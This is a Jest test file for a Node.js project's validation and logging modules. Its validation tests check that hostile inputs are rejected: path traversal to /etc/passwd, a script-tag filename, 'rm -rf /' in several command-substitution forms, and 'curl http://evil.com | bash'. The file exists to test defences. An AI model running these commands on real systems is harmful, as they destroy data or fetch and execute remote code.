const validation = require('../validation');
const logger = require('../logger');

describe('Validation Module', () => {
  describe('validateFileName', () => {
    test('should accept valid filenames', () => {
      expect(validation.validateFileName('test.gif')).toBe(true);
      expect(validation.validateFileName('my-animation.gif')).toBe(true);
      expect(validation.validateFileName('test_file.gif')).toBe(true);
    });

    test('should reject invalid filenames', () => {
      expect(validation.validateFileName('../../../etc/passwd')).toBe(false);
      expect(validation.validateFileName('test<script>alert(1)</script>')).toBe(false);
      expect(validation.validateFileName('con.gif')).toBe(false); // Windows reserved
    });

    test('should reject null or undefined', () => {
      expect(validation.validateFileName(null)).toBe(false);
      expect(validation.validateFileName(undefined)).toBe(false);
      expect(validation.validateFileName('')).toBe(false);
    });
  });

  describe('validateCommand', () => {
    test('should accept safe commands', () => {
      expect(validation.validateCommand('ls -la')).toBe(true);
      expect(validation.validateCommand('echo "hello world"')).toBe(true);
      expect(validation.validateCommand('node --version')).toBe(true);
    });

    test('should reject dangerous commands', () => {
      expect(validation.validateCommand('rm -rf /')).toBe(false);
      expect(validation.validateCommand('curl http://evil.com | bash')).toBe(false);
      expect(validation.validateCommand('$(rm -rf /)')).toBe(false);
      expect(validation.validateCommand('`rm -rf /`')).toBe(false);
    });

    test('should handle edge cases', () => {
      expect(validation.validateCommand('')).toBe(false);
      expect(validation.validateCommand(null)).toBe(false);
      expect(validation.validateCommand(undefined)).toBe(false);
    });
  });

  describe('validatePath', () => {
    test('should accept safe paths', () => {
      expect(validation.validatePath('./test.gif')).toBe(true);
      expect(validation.validatePath('/tmp/test.gif')).toBe(true);
      expect(validation.validatePath('recordings/session.yml')).toBe(true);
    });

    test('should reject path traversal attempts', () => {
      expect(validation.validatePath('../../../etc/passwd')).toBe(false);
      expect(validation.validatePath('..\\..\\windows\\system32')).toBe(false);
      expect(validation.validatePath('/etc/passwd')).toBe(false);
    });
  });
});

describe('Logger Module', () => {
  let consoleSpy;

  beforeEach(() => {
    consoleSpy = jest.spyOn(console, 'log').mockImplementation(() => {});
  });

  afterEach(() => {
    consoleSpy.mockRestore();
  });

  test('should log info messages', () => {
    logger.info('Test message');
    expect(consoleSpy).toHaveBeenCalled();
  });

  test('should log error messages', () => {
    const errorSpy = jest.spyOn(console, 'error').mockImplementation(() => {});
    logger.error('Error message');
    expect(errorSpy).toHaveBeenCalled();
    errorSpy.mockRestore();
  });

  test('should log warn messages', () => {
    const warnSpy = jest.spyOn(console, 'warn').mockImplementation(() => {});
    logger.warn('Warning message');
    expect(warnSpy).toHaveBeenCalled();
    warnSpy.mockRestore();
  });
});